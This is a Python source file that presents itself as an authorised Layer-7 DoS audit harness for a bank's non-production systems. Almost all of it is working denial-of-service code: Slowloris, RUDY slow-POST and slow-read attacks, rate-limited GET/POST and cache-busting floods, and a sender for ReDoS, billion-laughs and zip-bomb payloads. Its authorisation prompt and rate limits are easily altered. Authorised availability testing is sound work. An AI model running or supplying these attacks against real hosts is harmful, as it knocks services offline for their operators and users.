"""
l7_audit.py - Multi-technique Layer-7 DoS audit harness.

Audit context:
  - Barclays non-prod, signed Rules of Engagement required before use.
  - Goal: evidence audit findings against L7 availability controls.
  - Stdlib-only (no pip install). Runs on a locked-down jump box.

Subcommands (all live-testable L7 families):
  slow-headers   Slowloris (drip header bytes).
  slow-body      RUDY (slow POST body drip).
  slow-read      Slow read (tiny TCP receive window).
  http-flood     High-rate GET flood.
  cache-bust     GET flood with random query strings (CDN cache bypass).
  post-flood     High-rate POST flood with configurable body.
  payload        Single-payload algorithmic test (ReDoS, billion-laughs, etc.).

Common flags:
  --host --port --tls --duration --evidence-dir
  Authorisation prompt gate. Probe thread logs response state to JSONL.

Out of scope for this script (and why):
  - HTTP/2 Rapid Reset (CVE-2023-44487): review server version + config
    (nginx >=1.25.3, h2o, Envoy, Go net/http patches). Live exploitation
    requires specialist PoC and risk/reward is poor for audit.
  - TLS renegotiation flood: review TLS config (renegotiation disabled
    in modern stacks); live test rarely lands a finding worth the risk.
  - L4/volumetric/amplification: see DoS test matrix; review controls.
"""

from __future__ import annotations

import argparse
import datetime as dt
import http.client
import json
import logging
import random
import socket
import ssl
import string
import sys
import threading
import time
import urllib.parse
import urllib.request
from pathlib import Path


USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
]


# ----------------------------------------------------------------------------
# Shared infrastructure
# ----------------------------------------------------------------------------


def confirm_authorisation(host: str, technique: str) -> None:
    print(f"\nTECHNIQUE: {technique}")
    print(f"TARGET:    {host}")
    print("Run only against systems you own or have written authorisation")
    print("to test (signed Rules of Engagement).\n")
    typed = input(f'Type the target host ("{host}") to confirm authorisation: ').strip()
    if typed != host:
        print("Confirmation did not match. Aborting.")
        sys.exit(1)


def setup_evidence(host: str, technique: str, evidence_dir: str):
    d = Path(evidence_dir)
    d.mkdir(parents=True, exist_ok=True)
    run_id = dt.datetime.now().strftime("%Y%m%dT%H%M%S")
    base = d / f"{technique}_{host}_{run_id}"
    log_path = base.with_suffix(".log")
    jsonl_path = base.with_suffix(".jsonl")
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)s %(message)s",
        handlers=[logging.FileHandler(log_path), logging.StreamHandler()],
        force=True,
    )
    return logging.getLogger(technique), jsonl_path, log_path, run_id


def probe(host: str, port: int, use_tls: bool, path: str = "/") -> tuple[bool, float]:
    """Legitimate-client probe. Returns (responded, latency_seconds)."""
    start = time.monotonic()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((host, port))
        if use_tls:
            ctx = ssl.create_default_context()
            s = ctx.wrap_socket(s, server_hostname=host)
        req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
        s.send(req.encode())
        data = s.recv(64)
        s.close()
        return (bool(data), time.monotonic() - start)
    except OSError:
        return (False, time.monotonic() - start)


class ProbeThread(threading.Thread):
    """Background probe at fixed interval, writes JSONL evidence."""

    def __init__(self, host, port, tls, interval, jsonl_path, get_state, stop_event):
        super().__init__(daemon=True)
        self.host, self.port, self.tls = host, port, tls
        self.interval = interval
        self.jsonl_path = jsonl_path
        self.get_state = get_state  # callable returning dict of attacker-side state
        self.stop_event = stop_event
        self.start_time = time.monotonic()

    def run(self):
        with open(self.jsonl_path, "w") as f:
            while not self.stop_event.is_set():
                ok, latency = probe(self.host, self.port, self.tls)
                event = {
                    "ts": dt.datetime.now().isoformat(),
                    "elapsed_s": round(time.monotonic() - self.start_time, 2),
                    "probe_responded": ok,
                    "probe_latency_s": round(latency, 3),
                    **self.get_state(),
                }
                f.write(json.dumps(event) + "\n")
                f.flush()
                state = "OK" if ok else "DEGRADED/DOWN"
                logging.info("probe %s latency=%.2fs %s",
                             state, latency, self.get_state())
                if self.stop_event.wait(self.interval):
                    break


def open_raw_socket(host, port, use_tls, timeout=4):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        if use_tls:
            ctx = ssl.create_default_context()
            s = ctx.wrap_socket(s, server_hostname=host)
        return s
    except OSError:
        return None


# ----------------------------------------------------------------------------
# Slow-attack subcommands
# ----------------------------------------------------------------------------


def cmd_slow_headers(a):
    """Slowloris: open many sockets, send partial headers, drip 1 byte."""
    confirm_authorisation(a.host, "slow-headers")
    log, jsonl, _, _ = setup_evidence(a.host, "slow-headers", a.evidence_dir)
    stop = threading.Event()
    sockets: list[socket.socket] = []

    def open_one():
        s = open_raw_socket(a.host, a.port, a.tls)
        if not s:
            return None
        try:
            s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {a.host}\r\n".encode())
            s.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
            s.send(b"Accept-language: en-US,en,q=0.5\r\n")
            return s
        except OSError:
            return None

    for _ in range(a.sockets):
        s = open_one()
        if s:
            sockets.append(s)
    log.info("initial sockets held=%d/%d", len(sockets), a.sockets)

    probe_t = ProbeThread(a.host, a.port, a.tls, a.probe_interval, jsonl,
                          lambda: {"held_sockets": len(sockets)}, stop)
    probe_t.start()
    start = time.monotonic()

    try:
        while time.monotonic() - start < a.duration:
            alive = []
            for s in sockets:
                try:
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    alive.append(s)
                except OSError:
                    try: s.close()
                    except OSError: pass
            while len(alive) < a.sockets:
                s = open_one()
                if s: alive.append(s)
                else: break
            sockets = alive
            log.info("keepalive cycle: held=%d", len(sockets))
            time.sleep(a.keepalive_interval)
    except KeyboardInterrupt:
        log.info("interrupted")
    finally:
        stop.set(); probe_t.join(timeout=2)
        for s in sockets:
            try: s.close()
            except OSError: pass
        log.info("evidence: %s", jsonl)


def cmd_slow_body(a):
    """RUDY: declare large Content-Length, drip body 1 byte every N seconds."""
    confirm_authorisation(a.host, "slow-body")
    log, jsonl, _, _ = setup_evidence(a.host, "slow-body", a.evidence_dir)
    stop = threading.Event()
    sockets: list[socket.socket] = []

    def open_one():
        s = open_raw_socket(a.host, a.port, a.tls)
        if not s:
            return None
        try:
            s.send(f"POST {a.path} HTTP/1.1\r\n".encode())
            s.send(f"Host: {a.host}\r\n".encode())
            s.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
            s.send(b"Content-Type: application/x-www-form-urlencoded\r\n")
            s.send(f"Content-Length: {a.content_length}\r\n\r\n".encode())
            s.send(b"a")  # one byte of body
            return s
        except OSError:
            return None

    for _ in range(a.sockets):
        s = open_one()
        if s: sockets.append(s)
    log.info("initial sockets held=%d/%d path=%s", len(sockets), a.sockets, a.path)

    probe_t = ProbeThread(a.host, a.port, a.tls, a.probe_interval, jsonl,
                          lambda: {"held_sockets": len(sockets)}, stop)
    probe_t.start()
    start = time.monotonic()

    try:
        while time.monotonic() - start < a.duration:
            alive = []
            for s in sockets:
                try:
                    s.send(b"a")
                    alive.append(s)
                except OSError:
                    try: s.close()
                    except OSError: pass
            while len(alive) < a.sockets:
                s = open_one()
                if s: alive.append(s)
                else: break
            sockets = alive
            log.info("drip cycle: held=%d", len(sockets))
            time.sleep(a.keepalive_interval)
    except KeyboardInterrupt:
        log.info("interrupted")
    finally:
        stop.set(); probe_t.join(timeout=2)
        for s in sockets:
            try: s.close()
            except OSError: pass
        log.info("evidence: %s", jsonl)


def cmd_slow_read(a):
    """Slow read: send full request, then read response 1 byte at a long interval.

    Note: setting a tiny SO_RCVBUF before connect is the canonical way to force
    the server to throttle its send rate (advertised TCP window stays small).
    """
    confirm_authorisation(a.host, "slow-read")
    log, jsonl, _, _ = setup_evidence(a.host, "slow-read", a.evidence_dir)
    stop = threading.Event()
    sockets: list[socket.socket] = []

    def open_one():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, a.recv_buf)
            s.settimeout(4)
            s.connect((a.host, a.port))
            if a.tls:
                ctx = ssl.create_default_context()
                s = ctx.wrap_socket(s, server_hostname=a.host)
            req = (
                f"GET {a.path} HTTP/1.1\r\n"
                f"Host: {a.host}\r\n"
                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                f"Accept: */*\r\n"
                f"Connection: keep-alive\r\n\r\n"
            )
            s.send(req.encode())
            return s
        except OSError:
            return None

    for _ in range(a.sockets):
        s = open_one()
        if s: sockets.append(s)
    log.info("initial sockets held=%d/%d recv_buf=%d", len(sockets), a.sockets, a.recv_buf)

    probe_t = ProbeThread(a.host, a.port, a.tls, a.probe_interval, jsonl,
                          lambda: {"held_sockets": len(sockets)}, stop)
    probe_t.start()
    start = time.monotonic()

    try:
        while time.monotonic() - start < a.duration:
            alive = []
            for s in sockets:
                try:
                    s.settimeout(0.1)
                    try:
                        _ = s.recv(1)  # drain one byte slowly
                    except (socket.timeout, ssl.SSLWantReadError):
                        pass
                    alive.append(s)
                except OSError:
                    try: s.close()
                    except OSError: pass
            while len(alive) < a.sockets:
                s = open_one()
                if s: alive.append(s)
                else: break
            sockets = alive
            log.info("slow-read cycle: held=%d", len(sockets))
            time.sleep(a.read_interval)
    except KeyboardInterrupt:
        log.info("interrupted")
    finally:
        stop.set(); probe_t.join(timeout=2)
        for s in sockets:
            try: s.close()
            except OSError: pass
        log.info("evidence: %s", jsonl)


# ----------------------------------------------------------------------------
# High-rate flood subcommands
# ----------------------------------------------------------------------------


def _flood_worker(host, port, tls, method, path_fn, body_fn, headers,
                  stop_event, counters, rate_limiter):
    """Generic flood worker. path_fn() and body_fn() called per request."""
    scheme = "https" if tls else "http"
    while not stop_event.is_set():
        rate_limiter.wait()
        path = path_fn()
        body = body_fn() if body_fn else None
        start = time.monotonic()
        try:
            if tls:
                conn = http.client.HTTPSConnection(host, port, timeout=10,
                                                   context=ssl.create_default_context())
            else:
                conn = http.client.HTTPConnection(host, port, timeout=10)
            conn.request(method, path, body=body, headers=headers)
            resp = conn.getresponse()
            _ = resp.read(256)
            counters["requests"] += 1
            counters["status_" + str(resp.status)] = counters.get("status_" + str(resp.status), 0) + 1
            counters["latency_sum"] += time.monotonic() - start
            conn.close()
        except OSError:
            counters["errors"] += 1
        except http.client.HTTPException:
            counters["errors"] += 1


class TokenBucket:
    """Simple token bucket so flood RPS is bounded (audit, not stress-to-death)."""

    def __init__(self, rps: float):
        self.rps = rps
        self.tokens = rps
        self.lock = threading.Lock()
        self.last = time.monotonic()

    def wait(self):
        while True:
            with self.lock:
                now = time.monotonic()
                self.tokens = min(self.rps, self.tokens + (now - self.last) * self.rps)
                self.last = now
                if self.tokens >= 1:
                    self.tokens -= 1
                    return
            time.sleep(0.005)


def _run_flood(a, technique, method, path_fn, body_fn, extra_headers=None):
    confirm_authorisation(a.host, technique)
    log, jsonl, _, _ = setup_evidence(a.host, technique, a.evidence_dir)
    stop = threading.Event()
    counters = {"requests": 0, "errors": 0, "latency_sum": 0.0}
    headers = {"Host": a.host, "User-Agent": random.choice(USER_AGENTS),
               "Connection": "close"}
    if extra_headers:
        headers.update(extra_headers)
    bucket = TokenBucket(a.rps)

    workers = []
    for _ in range(a.workers):
        t = threading.Thread(target=_flood_worker,
                             args=(a.host, a.port, a.tls, method, path_fn, body_fn,
                                   headers, stop, counters, bucket),
                             daemon=True)
        t.start()
        workers.append(t)

    def state():
        n = counters["requests"] or 1
        return {"requests": counters["requests"], "errors": counters["errors"],
                "avg_latency_s": round(counters["latency_sum"] / n, 3)}

    probe_t = ProbeThread(a.host, a.port, a.tls, a.probe_interval, jsonl, state, stop)
    probe_t.start()

    log.info("flood started rps=%s workers=%s duration=%ds",
             a.rps, a.workers, a.duration)
    try:
        time.sleep(a.duration)
    except KeyboardInterrupt:
        log.info("interrupted")
    finally:
        stop.set()
        for t in workers:
            t.join(timeout=2)
        probe_t.join(timeout=2)
        log.info("totals=%s evidence=%s", state(), jsonl)


def cmd_http_flood(a):
    _run_flood(a, "http-flood", "GET", lambda: a.path, None)


def cmd_cache_bust(a):
    sep = "&" if "?" in a.path else "?"
    def path_fn():
        token = "".join(random.choices(string.ascii_letters + string.digits, k=12))
        return f"{a.path}{sep}_cb={token}"
    _run_flood(a, "cache-bust", "GET", path_fn, None,
               extra_headers={"Cache-Control": "no-cache", "Pragma": "no-cache"})


def cmd_post_flood(a):
    body = Path(a.body_file).read_bytes() if a.body_file else b""
    extra = {"Content-Type": a.content_type, "Content-Length": str(len(body))}
    _run_flood(a, "post-flood", "POST", lambda: a.path, lambda: body, extra_headers=extra)


# ----------------------------------------------------------------------------
# Algorithmic / payload subcommand
# ----------------------------------------------------------------------------


def cmd_payload(a):
    """Single-payload test: send N requests with a crafted body, measure latency.

    Use for: ReDoS (catastrophic regex input), XML billion-laughs / XXE,
    JSON deeply-nested, large multipart, zip-bomb upload, search-all queries.
    Audit signal: server latency or error spike >>> baseline.
    """
    confirm_authorisation(a.host, "payload")
    log, jsonl, _, _ = setup_evidence(a.host, "payload", a.evidence_dir)
    body = Path(a.payload_file).read_bytes()
    url = f"{'https' if a.tls else 'http'}://{a.host}:{a.port}{a.path}"

    results = []
    log.info("payload bytes=%d url=%s requests=%d", len(body), url, a.requests)

    for i in range(a.requests):
        start = time.monotonic()
        status, err = None, None
        try:
            req = urllib.request.Request(url, data=body, method=a.method,
                                         headers={"Content-Type": a.content_type,
                                                  "User-Agent": random.choice(USER_AGENTS)})
            ctx = ssl.create_default_context() if a.tls else None
            with urllib.request.urlopen(req, timeout=a.timeout, context=ctx) as resp:
                _ = resp.read(256)
                status = resp.status
        except Exception as e:  # noqa: BLE001 - audit harness, capture everything
            err = type(e).__name__ + ": " + str(e)[:120]
        latency = time.monotonic() - start
        results.append({"i": i, "status": status, "error": err,
                        "latency_s": round(latency, 3)})
        log.info("req=%d status=%s err=%s latency=%.2fs", i, status, err, latency)

    with open(jsonl, "w") as f:
        for r in results:
            f.write(json.dumps(r) + "\n")
    avg = sum(r["latency_s"] for r in results) / len(results)
    log.info("done. avg_latency=%.2fs evidence=%s", avg, jsonl)


# ----------------------------------------------------------------------------
# CLI
# ----------------------------------------------------------------------------


def build_parser():
    p = argparse.ArgumentParser(description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = p.add_subparsers(dest="cmd", required=True)

    def common(sp, with_path=False):
        sp.add_argument("--host", required=True)
        sp.add_argument("--port", type=int, default=443)
        sp.add_argument("--tls", action="store_true")
        sp.add_argument("--duration", type=int, default=180)
        sp.add_argument("--probe-interval", type=int, default=5)
        sp.add_argument("--evidence-dir", default="./evidence")
        if with_path:
            sp.add_argument("--path", default="/")

    sp = sub.add_parser("slow-headers"); common(sp)
    sp.add_argument("--sockets", type=int, default=150)
    sp.add_argument("--keepalive-interval", type=int, default=15)
    sp.set_defaults(func=cmd_slow_headers)

    sp = sub.add_parser("slow-body"); common(sp, with_path=True)
    sp.add_argument("--sockets", type=int, default=150)
    sp.add_argument("--keepalive-interval", type=int, default=15)
    sp.add_argument("--content-length", type=int, default=8192)
    sp.set_defaults(func=cmd_slow_body)

    sp = sub.add_parser("slow-read"); common(sp, with_path=True)
    sp.add_argument("--sockets", type=int, default=150)
    sp.add_argument("--read-interval", type=int, default=10)
    sp.add_argument("--recv-buf", type=int, default=128)
    sp.set_defaults(func=cmd_slow_read)

    sp = sub.add_parser("http-flood"); common(sp, with_path=True)
    sp.add_argument("--rps", type=float, default=50)
    sp.add_argument("--workers", type=int, default=20)
    sp.set_defaults(func=cmd_http_flood)

    sp = sub.add_parser("cache-bust"); common(sp, with_path=True)
    sp.add_argument("--rps", type=float, default=50)
    sp.add_argument("--workers", type=int, default=20)
    sp.set_defaults(func=cmd_cache_bust)

    sp = sub.add_parser("post-flood"); common(sp, with_path=True)
    sp.add_argument("--rps", type=float, default=25)
    sp.add_argument("--workers", type=int, default=20)
    sp.add_argument("--body-file")
    sp.add_argument("--content-type", default="application/json")
    sp.set_defaults(func=cmd_post_flood)

    sp = sub.add_parser("payload"); common(sp, with_path=True)
    sp.add_argument("--payload-file", required=True)
    sp.add_argument("--method", default="POST")
    sp.add_argument("--content-type", default="application/xml")
    sp.add_argument("--requests", type=int, default=10)
    sp.add_argument("--timeout", type=int, default=30)
    sp.set_defaults(func=cmd_payload)

    return p


if __name__ == "__main__":
    args = build_parser().parse_args()
    sys.exit(args.func(args) or 0)
